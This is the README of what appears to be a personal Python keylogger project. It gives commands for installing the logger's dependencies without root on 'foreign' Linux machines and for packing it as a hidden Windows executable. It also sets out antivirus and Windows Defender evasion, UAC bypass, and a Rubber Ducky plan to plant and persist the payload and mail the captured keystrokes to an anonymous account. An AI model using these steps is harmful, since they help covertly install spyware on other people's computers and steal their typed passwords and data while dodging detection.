# Under Construction
If I want to continue on this project someday here is where I stopped:
- The python keylogger is working (Python2.7 or Python3.8)
    - It can be installed without pip being already on the system and without sudo on linux
- Antivirus-Evasion Folder with instructions.md created for Antivirus Evasion
    - Antivirusevasion is working by following and improving from https://www.quora.com/How-do-I-make-an-executable-file-exe-which-runs-in-the-Windows-Environment-from-Python-py-file?share=1
    - The last Testrun with encryption did not succeed on Windows 10. Without encryption and just base64 encoding it worked.
    - AV is not picking it up, but Windows Defender is. This can be due to:
        - a) Since mid 2020 Windows only allows *.exe files that are Digitally Signed. Hence I would need to apply for signin Hint: https://sectigostore.com/code-signing/sectigo-code-signing-certificate
        - b) pyinstaller --onefile includes the HexCode for "pyi-windows-manifest-filename" near the end of executable. YARA rules can pick this up easily. Hence try to not use --onefile and pack folder with a Windows Packer. Hint https://www.cyborgsecurity.com/cyborg_labs/python-malware-on-the-rise/ another option would be to compile pyinstaller yourself but before this remove the line of code where it adds the string
        - c) Unsolved: Persist file (via Rubber Ducky Payload) https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads
        - d) If necessary bypass UAC https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/
- Phantom Evasion has been installed but couldn't figure out how it functions, manual way seems quicker
    - Interesting part in it would have been "Randomized junkcode injection (intensity,frequency and reinjection probability can be set) and windows antivirus evasion techniques (frequency can be set)"
- Alternative for Windows use https://github.com/MinhasKamal/StupidKeylogger
- Many more here: https://github.com/topics/keylogger
- And try this someday https://forums.hak5.org/topic/38984-disable-windows-defencer/
- Deploy with Rubber Ducky in Theory:
    - Use Tails OS to create an E-Mailaccount with ProtonMail
    - From Tails OS upload the payload to a Fileuploader
    - With Rubber Ducky payload download, run and persist the uploaded file and send information back as email w/ attachement or use the "generate_email_from_csv" from this repository.
- FYI: Advanced Open Source Python Malware: pupy and pymicropsia
- FYI: Fun project https://github.com/angus-y/PyIris-backdoor


# Keylogger

## Requirements
Needs to be run in /home/user
pip3 pynput

## Run on Linux
To make sure the console does not appear when running the script save it as a *.pyw file

### Install pynput without root rights for deployment on foreign Linux computers
wget https://bootstrap.pypa.io/get-pip.py && python3 get-pip.py --user
cd .local/bin
./pip install pynput --user

## Pack for Windows on Windows
How to pack it with pyinstaller. This has to be done in windows environment.
- Install python3 (not from App Store but from www.python.org) for compatibility use 32bit Version
- Add python to Path in System Variables in Windows (e.g. %APPDATA%\Local\Programs\Python\Python39-32\)


Then go into CMD into this folder:
<code>
python -m pip install virtualenv
python -m pip install pyinstaller 
python -m venv env
env\\Scripts\\activate
python -m pip install -r requirements.txt
python -m pip install pyinstaller
python -m PyInstaller --onefile -w -F keylogger-usage.pyw
</code>

After running this you find the error log in 
<code>build/keylogger-usage/warn-keylogger-usage.txt</code>
which have to be inspected and the *.exe file in 
<code>dist/keylogger-usage</code>

### Antivirus evasion

This is recommended see file Antivirus-Evasion\instructions.md

### Phantom Evasion
https://github.com/oddcod3/Phantom-Evasion
https://kalilinuxtutorials.com/phantom-evasion/   => Section "Wine-Pyinstaller modules:"

If on KaliLinux manual install is not necessary.

##### Manual Install
Metasploit: https://github.com/rapid7/metasploit-framework run the nightly script from github for installation

For setup of Phantom-Evasion:
Clone from git and change the line 
<code>
def OtherLinuxSetup(rel):
</code>
in the file Setup/Setup_lib.py to
<code>
def OtherLinuxSetup(rel = ["ubuntu"]):
</code>
or similar depending on the current OS.

<code>
python3 phantom-evasion.py
</code>

## Source
https://nitratine.net/blog/post/python-keylogger/
https://nitratine.net/blog/post/convert-py-to-exe/#pyinstaller